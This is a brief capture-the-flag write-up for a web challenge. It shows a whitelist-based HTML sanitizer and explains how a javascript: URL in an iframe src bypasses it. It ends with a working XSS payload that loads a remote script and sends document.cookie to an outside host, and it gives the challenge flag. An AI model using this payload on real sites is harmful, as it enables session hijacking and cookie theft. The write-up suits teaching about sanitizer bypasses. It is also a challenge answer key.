# static-static-hosting (222 solves)

Source: [script.js](./script.js)

```js
function sanitize(element) {
	const attributes = element.getAttributeNames();
	for (let i = 0; i < attributes.length; i++) {
		// Let people add images and styles
		if (!["src", "width", "height", "alt", "class"].includes(attributes[i])) {
			element.removeAttribute(attributes[i]);
		}
	}

	const children = element.children;
	for (let i = 0; i < children.length; i++) {
		if (children[i].nodeName === "SCRIPT") {
			element.removeChild(children[i]);
			i--;
		} else {
			sanitize(children[i]);
		}
	}
}
```

This time, the script sanitizes your input by removing all attributes except those on a whitelist and removing all script elements. However, we can still perform XSS by using a `javascript:` url as an iframe src.

Final Exploit:

```html
<iframe src="javascript:a=document.createElement('script'),a.setAttribute('src','https://example.com/x.js?cookie='+document.cookie),document.documentElement.appendChild(a)"></iframe>
```

Flag: `flag{wh0_n33d5_d0mpur1fy}`
